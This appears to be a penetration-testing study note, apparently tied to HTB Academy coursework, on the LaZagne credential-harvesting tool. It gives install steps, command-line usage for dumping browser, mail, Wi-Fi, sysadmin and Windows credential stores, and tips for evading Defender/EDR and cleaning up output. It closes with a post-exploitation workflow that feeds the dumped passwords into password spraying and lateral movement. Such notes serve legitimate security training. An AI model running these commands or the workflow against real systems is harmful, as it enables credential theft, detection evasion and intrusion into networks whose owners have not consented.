# LaZagne

**Tags:** `#lazagne` `#credentials` `#pillaging` `#postexploitation` `#auth` `#looting`

Open-source credential harvester — once you have a shell on a host, LaZagne rummages
through locally-stored secrets across **13+ software categories** (browsers, mail
clients, Wi-Fi, databases, sysadmin tools, chats, Git, and Windows' own credential
stores) and prints any passwords it can decrypt. The post-exploitation "loot the box"
tool: it turns a foothold into reusable creds for lateral movement.

**Source:** https://github.com/AlessandroZ/LaZagne (Windows / Linux / Mac)
**Install:** not on Kali by default. Grab the pre-built `laZagne.exe` from Releases for a
target Windows host, or run the Python source on Linux/Mac:

```bash
git clone https://github.com/AlessandroZ/LaZagne
# Windows: drop laZagne.exe on target; Linux/Mac: run the platform script from source
```

> [!warning] **Heavily signatured** — `laZagne.exe` is one of the most-flagged binaries
> in existence; stock Defender/EDR kills it on write. Expect to run it from memory,
> recompile, or use an alternative. It also writes plaintext creds to disk if you use
> `-oA/-oN/-oJ` — clean up the output file afterward.

> [!note] **See also** — [[Tools/Auth/mimikatz|mimikatz]] (Windows LSASS/DPAPI/LSA, the
> heavier Windows-secrets tool); [[Tools/Auth/Firefox Decrypt|Firefox Decrypt]] (targeted
> browser-only alternative); [[Tools/Credential Dumping/secretsdump|secretsdump]] (remote
> SAM/LSA). Also used in
> [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] (CPTS v2).

---

## Module Categories

Run `all`, or scope to one category to stay quiet and fast:

| Category | Recovers |
|---|---|
| `browsers` | Chrome/Edge/Firefox/etc. saved logins & cookies |
| `mails` | Thunderbird, Outlook |
| `wifi` | Wireless PSKs *(needs admin/sudo)* |
| `windows` | LSA secrets, Credential Manager, cached domain creds *(needs admin)* |
| `databases` | DBVisualizer, SQL Developer, Postgres, etc. |
| `sysadmin` | WinSCP, PuTTY, OpenVPN, FileZilla, WinVNC, etc. |
| `chats` | Pidgin, Skype, etc. |
| `git` / `svn` / `maven` / `php` | Dev-tool stored creds |
| `memory` | Scrapes KeePass / running-process memory |
| `games`, `multimedia` | Misc app stores |

---

## Usage

```cmd
:: Everything (loudest, most thorough)
laZagne.exe all

:: One category — e.g. only browsers, or only sysadmin tools
laZagne.exe browsers
laZagne.exe sysadmin

:: A single piece of software within a category
laZagne.exe browsers -firefox

:: Wi-Fi + Windows secrets need elevation (UAC / SYSTEM)
laZagne.exe all            # run from an elevated / SYSTEM shell to catch these
```

```cmd
:: Output to file — pick a format, and set a directory
laZagne.exe all -oN                                   :: normal .txt
laZagne.exe all -oJ                                   :: JSON
laZagne.exe all -oA -output C:\Windows\Temp           :: all formats, chosen dir

:: Verbosity / stealthier console
laZagne.exe all -vv                                   :: debug output
laZagne.exe all -quiet -oJ                            :: no console spam, dump to JSON
```

> [!tip] **Elevation matters.** Unprivileged, LaZagne still grabs user-scope creds
> (browsers, saved app passwords). As **admin/SYSTEM** it additionally unlocks `wifi` and
> the `windows` store (LSA secrets, Credential Manager) — so run it once as the user for
> quick wins, then again after you escalate.

---

## Where It Fits

1. Land a shell → run `laZagne.exe browsers sysadmin` for fast, low-priv wins.
2. Feed recovered passwords into spraying/reuse ([[Tools/Auth/Kerbrute|Kerbrute]],
   NetExec) — users reuse them across the domain.
3. After privesc, re-run `all` from SYSTEM to sweep `wifi` + `windows` secrets.
4. Overlaps [[Tools/Auth/mimikatz|mimikatz]] for Windows secrets — LaZagne is broader
   (many apps) but shallower; mimikatz goes deeper on LSASS/DPAPI/tickets.

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
